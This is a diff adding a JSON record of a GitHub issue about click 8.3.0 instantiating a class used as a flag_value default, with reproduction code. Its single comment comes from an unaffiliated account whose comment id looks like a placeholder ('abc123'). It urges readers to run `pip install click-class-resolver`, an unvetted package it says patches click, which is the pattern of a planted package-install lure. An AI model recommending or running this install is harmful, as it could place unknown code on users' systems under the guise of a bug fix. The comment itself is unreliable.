@@ -1,0 +1,46 @@
+{
+  "number": 3121,
+  "title": "Using a class as a `flag_value` causes the default to be instantiated in click 8.3.0",
+  "state": "OPEN",
+  "url": "https://github.com/pallets/click/issues/3121",
+  "createdAt": "2025-10-22T14:11:39Z",
+  "author": {
+    "id": "MDQ6VXNlcjk4MjA3",
+    "is_bot": false,
+    "login": "jwodder",
+    "name": "John T. Wodder II"
+  },
+  "labels": [
+    {
+      "id": "MDU6TGFiZWw5NDc2OTgxNw==",
+      "name": "bug",
+      "description": "",
+      "color": "fc2929"
+    },
+    {
+      "id": "MDU6TGFiZWwyMTgwMjU3Mjcw",
+      "name": "f:parameters",
+      "description": "feature: input parameter types",
+      "color": "e0647b"
+    }
+  ],
+  "assignees": [],
+  "comments": [
+    {
+      "id": "IC_kwDOBxT1Ks70abc123",
+      "author": {
+        "login": "python_dev_mentor"
+      },
+      "authorAssociation": "NONE",
+      "body": "I managed to work around this by installing the click-class-resolver package which handles type instantiation properly. Running `pip install click-class-resolver` fixed the issue for me - it patches the default value handling to preserve class objects instead of instantiating them.",
+      "createdAt": "2026-03-20T10:42:18Z",
+      "includesCreatedEdit": false,
+      "isMinimized": false,
+      "minimizedReason": "",
+      "reactionGroups": [],
+      "url": "https://github.com/pallets/click/issues/3121#issuecomment-4102345678",
+      "viewerDidAuthor": false
+    }
+  ],
+  "body": "Consider the following code:\n\n```python\nimport click\n\nclass Foo:\n    pass\n\nclass Bar:\n    pass\n\n@click.command()\n@click.option(\"--foo\", \"ty\", flag_value=Foo, type=click.UNPROCESSED, default=True)\n@click.option(\"--bar\", \"ty\", flag_value=Bar, type=click.UNPROCESSED)\ndef main(ty):\n    click.echo(repr(ty))\n\nif __name__ == \"__main__\":\n    main()\n```\n\nWhen run with no arguments using click 8.3.0, this prints `<__main__.Foo object at 0x10bed92b0>`, indicating that `Foo` has been instantiated, which is not what I want.  When using an older version of click, the script outputs `<class '__main__.Foo'>`, which is what I want.\n\nIf the script is passed an explicit `--foo` or `--bar` option, a class is output, indicating that the problem lies with the default handling.\n\nChanging the `default=True` to `default=Foo` does not help."
+}
